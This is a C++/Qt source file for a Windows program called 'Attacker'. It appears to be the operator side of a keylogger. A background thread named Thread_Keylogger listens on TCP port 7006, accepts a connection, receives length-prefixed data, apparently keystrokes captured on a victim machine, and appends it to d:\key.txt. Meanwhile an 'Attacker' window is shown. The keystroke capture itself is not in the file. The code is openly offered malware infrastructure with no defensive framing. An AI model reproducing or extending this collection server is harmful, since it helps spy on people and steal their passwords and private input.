#include "Attacker.h"
#include <QtWidgets/QApplication>
#include<WinSock2.h>
#include<Windows.h>
#include<process.h>
#include<qdesktopwidget.h>

#define KEYLOGGER_TRANS 7006
#pragma comment(lib,"ws2_32.lib")



unsigned WINAPI Thread_Keylogger(LPVOID v) 
{

	SOCKET ssock, csock;
	SOCKADDR_IN saddr = { 0, };
	QString str;
	HANDLE hfile = CreateFile(L"d:\\key.txt",GENERIC_WRITE,FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,NULL,OPEN_ALWAYS,NULL,NULL);
	//
	char* buf = Q_NULLPTR;
	ssock = socket(AF_INET, SOCK_STREAM, 0);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = htonl(INADDR_ANY);
	saddr.sin_port = htons(KEYLOGGER_TRANS);

	DWORD write_size = 0;
	bind(ssock, (LPSOCKADDR)&saddr, sizeof(saddr));
	listen(ssock, 64);
	csock = accept(ssock, NULL, NULL);
	SetFilePointer(hfile, 0l, nullptr, FILE_END);
	while (1) 
	{
		int size = 0;
		recv(csock, (char*)&size, 4, 0);
			
		buf = new char[size];
		ZeroMemory(buf, size);
		recv(csock, buf, size, 0);
			
		
		WriteFile(hfile, buf, size,&write_size, NULL);


		delete buf;
	}
	CloseHandle(hfile);
	return 0;

}


int main(int argc, char *argv[])
{
	WSADATA wsadata;
	WSAStartup(MAKEWORD(2, 2), &wsadata);
	QApplication a(argc, argv);
	HANDLE thread = (HANDLE)_beginthreadex(NULL, NULL, Thread_Keylogger, NULL, NULL, NULL);
	Attacker w;
	w.showMaximized();

	w.show();
	return a.exec();
}

